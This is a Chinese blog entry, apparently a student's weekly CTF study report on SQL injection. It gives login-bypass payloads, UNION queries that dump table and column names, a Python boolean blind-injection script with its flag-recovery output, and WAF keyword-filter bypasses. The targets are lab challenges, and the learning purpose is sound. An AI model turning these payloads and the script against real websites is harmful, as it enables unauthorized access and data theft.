  <entry>
    <author>
      <name>whymm</name>
    </author>
    <category term="Web" scheme="https://whymm.com.cn/categories/Web/"/>
    <category term="周报" scheme="https://whymm.com.cn/tags/%E5%91%A8%E6%8A%A5/"/>
    <category term="SQL注入" scheme="https://whymm.com.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    <category term="CTF" scheme="https://whymm.com.cn/tags/CTF/"/>
    <content>
      <![CDATA[<p>这一周基本都泡在 SQL 注入里：从最基础的登录绕过，到数字型注入用 UNION 拖库，再到关键词被 WAF 全删之后怎么绕，最后用布尔盲注一位一位把 flag 猜出来。这篇周报按「原理 → 题目 → 绕过 → 盲注」的顺序整理一遍，方便自己以后回看，也欢迎大佬指正。</p><h2 id="一、SQL-核心原理"><a href="#一、SQL-核心原理" class="headerlink" title="一、SQL 核心原理"></a>一、SQL 核心原理</h2><p>SQL 注入是一种将恶意 SQL 代码插入用户输入并由数据库执行的攻击方式，可导致数据泄露、权限提升甚至删除数据库等严重后果。常见场景包括登录框、搜索框、URL 参数等，核心防御手段是使用参数化查询与严格输入验证。</p><p><strong>SQL 注入的本质：用户输入的数据，被当作 SQL 语句的一部分执行。</strong></p><p>一个例子：一个登录页面，后台 SQL 语句如下（简化版）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;用户输入&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;用户输入&#x27;</span>;</span><br></pre></td></tr></table></figure><p>正常情况下，我们可以通过输入账号与密码登入，但如果用户利用 sql 漏洞恶意输入 <code>&#39; or 1=1-- </code>，则后台变为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--&#x27; and password=&#x27;随便输入&#x27;;</span></span><br></pre></td></tr></table></figure><p>用户就能在不知道密码的情况下登录。</p><p>解读：<code>--</code> 是 SQL 的注释符号，后面的内容会被注释掉，此时 SQL 语句等价于 <code>select * from user where username=&#39;&#39; or 1=1</code>，而 <code>1=1</code> 永远为真，所以会查询出所有用户信息，实现「免密码登录」—— 这就是最基础的 SQL 注入。</p><p>当然还有许多其他的语法，这需要我们不断的积累。这里给一张常用的名词表：</p><p><img src="/images/week1/01-schema-tables.png" alt="查库名 &#x2F; 表名 &#x2F; 字段名最常用的三张表"></p><h2 id="二、SQL-注入的危害"><a href="#二、SQL-注入的危害" class="headerlink" title="二、SQL 注入的危害"></a>二、SQL 注入的危害</h2><ul><li>数据泄露：获取用户信息、密码、订单等敏感数据。</li><li>权限提升：读到后台账号、用 <code>into outfile</code> 写文件，进一步执行系统命令拿下服务器。</li><li>数据篡改：<code>update</code>、<code>delete</code> 被打进去，整张表甚至整个库都可能被清掉。</li><li>绕过业务逻辑：登录校验、支付金额、管理员权限判断，都可能被一句 <code>or 1=1</code> 直接跳过。</li></ul><h2 id="三、一些-SQL-注入题目"><a href="#三、一些-SQL-注入题目" class="headerlink" title="三、一些 SQL 注入题目"></a>三、一些 SQL 注入题目</h2><p>我按我认为的难度分了一下级。</p><h3 id="1-数字型注入-报错回显-UNION"><a href="#1-数字型注入-报错回显-UNION" class="headerlink" title="1 [数字型注入 + 报错回显 + UNION]"></a>1 [数字型注入 + 报错回显 + UNION]</h3><p><strong>难度：拉玩了</strong></p><p>先输一个空值看看报错，很多时候报错里会直接把后台语句打出来：</p><p><img src="/images/week1/04-query-error.png" alt="id 传空值时，报错里直接打印了后台 SQL"></p><p>第一步：确定列数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">order</span> <span class="keyword">by</span> 数字</span><br></pre></td></tr></table></figure><p>数字由小到大，当恰好出现错误时：</p><p><img src="/images/week1/05-order-by.png" alt="ORDER BY 4 报 Unknown column &#39;4&#39; in &#39;order clause&#39;"></p><p>此时数字为 4，这说明有 3 列。</p><p>第二步：确定回显位</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><p>哪个数字输出则哪里为回显位（可打印数据的位置）：</p><p><img src="/images/week1/06-union-echo.png" alt="union select 1,2,3 三个位置全部回显"></p><p>这里都输出了则全部为回显位。</p><p>第三步：把回显位换成要查的数据，按「库名 → 表名 → 字段名 → 具体数据」一层层往下查：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, database(), <span class="number">3</span></span><br><span class="line"><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, group_concat(table_name), <span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, group_concat(column_name), <span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br><span class="line"><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, username, email <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>这一题的表里直接放着 flag，把第二个回显位换成 flag 所在字段即可：</p><p><img src="/images/week1/07-union-flag.png" alt="ID &#x3D; 1 | 用户名 &#x3D; flag{...} | 邮箱 &#x3D; 3"></p><h3 id="2-登录框：万能密码"><a href="#2-登录框：万能密码" class="headerlink" title="2 [登录框：万能密码]"></a>2 [登录框：万能密码]</h3><p><strong>难度：简单</strong></p><p>最经典的场景：用户名和密码被直接拼进 SQL，没有做任何过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><p>先正常输入一组账号密码，回显 <code>Login failed</code>：</p><p><img src="/images/week1/02-login-failed.png" alt="正常输入账号密码，回显 Login failed"></p><p>再把用户名换成 <code>admin&#39; -- -</code>（密码随便填），回显 <code>Hello admin</code>：</p><p><img src="/images/week1/03-login-bypass.png" alt="admin&#39; -- - 直接登录成功"></p><p>原因就是上面讲的那个注释：<code>--</code> 把后面校验密码的部分注释掉了，语句变成 <code>select * from users where username=&#39;admin&#39;</code>，只要 admin 存在就直接登录。</p><h3 id="3-布尔盲注"><a href="#3-布尔盲注" class="headerlink" title="3 [布尔盲注]"></a>3 [布尔盲注]</h3><p><strong>难度：有耐心就行</strong></p><p>页面既没有回显位、也不报错，只剩「登录成功 &#x2F; 登录失败」两种状态时，就只能一位一位地把 flag 试出来。</p><p>思路：从第一位开始，判断 <code>substr(flag, 1, 1)</code> 是不是某个字符，命中就把这一位拼到已知前缀上，再往后挪一位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8092/index.php&quot;</span></span><br><span class="line">charset = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_&#123;&#125;-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> charset:</span><br><span class="line">        payload = <span class="string">&quot;0&#x27; or substr((select flag from flag),%d,1)=&#x27;%s&#x27;#&quot;</span> % (pos, ch)</span><br><span class="line">        r = requests.get(url, params=&#123;<span class="string">&quot;id&quot;</span>: payload&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += ch</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;FLAG:&quot;</span>, flag)</span><br></pre></td></tr></table></figure><p>每命中一位就打印一次，所以能看到 flag 一点一点长出来：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">f</span><br><span class="line">fl</span><br><span class="line">fla</span><br><span class="line">flag</span><br><span class="line">flag&#123;</span><br><span class="line">flag&#123;b</span><br><span class="line">flag&#123;bl</span><br><span class="line">flag&#123;bl1</span><br><span class="line">flag&#123;bl1n</span><br><span class="line">flag&#123;bl1nd</span><br><span class="line">flag&#123;bl1nd_</span><br><span class="line">flag&#123;bl1nd_1</span><br><span class="line">flag&#123;bl1nd_1s</span><br><span class="line">flag&#123;bl1nd_1s_</span><br><span class="line">flag&#123;bl1nd_1s_p</span><br><span class="line">flag&#123;bl1nd_1s_pa</span><br><span class="line">flag&#123;bl1nd_1s_pat</span><br><span class="line">flag&#123;bl1nd_1s_pat1</span><br><span class="line">flag&#123;bl1nd_1s_pat1e</span><br><span class="line">flag&#123;bl1nd_1s_pat1en</span><br><span class="line">flag&#123;bl1nd_1s_pat1ent</span><br><span class="line">flag&#123;bl1nd_1s_pat1ent&#125;</span><br><span class="line">FLAG: flag&#123;bl1nd_1s_pat1ent&#125;</span><br></pre></td></tr></table></figure><h3 id="4-过滤-union-select-空格-注释，绕关键词"><a href="#4-过滤-union-select-空格-注释，绕关键词" class="headerlink" title="4 [过滤 union&#x2F;select&#x2F;空格&#x2F;注释，绕关键词]"></a>4 [过滤 union&#x2F;select&#x2F;空格&#x2F;注释，绕关键词]</h3><p><strong>难度：夯</strong></p><p><img src="/images/week1/08-waf-rules.png" alt="WAF 规则：删关键词、删空白、删注释"></p><p>我们看到许多关键词都被无效化了，这题可以用这些绕过方法。</p><p><strong>① 关键词双写</strong></p><p><code>union</code> → <code>ununionion</code>：删掉中间的 union 后，剩下 union。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union     → ununionion</span><br><span class="line">select    → seselectlect</span><br><span class="line">from      → frfromom</span><br><span class="line">where     → wwherehere</span><br></pre></td></tr></table></figure><p><strong>② <code>/**/</code> 代替空格</strong></p><p>MySQL 里 <code>/**/</code> 是注释，可以用来分隔 token；WAF 只删空白和 <code>--</code> &#x2F; <code>#</code>，不删它。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="comment">/**/</span>ununionion<span class="comment">/**/</span>seselectlect<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><p><strong>③ 词中词要特别注意</strong></p><p><code>information_schema</code> 里含 <code>or</code>，会被删成 <code>infmation_schema</code>：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">infoorrmation_schema</span><br></pre></td></tr></table></figure><p>后就可按照这个规则查出 flag。</p><p>但之所以我认为这类题目难，是<strong>它每题规则不同，需要你自己摸索</strong>。</p><hr><p>最后我的报告就差不多结束了，如果有错误，请一定要指出来，我会及时更新。</p>]]>
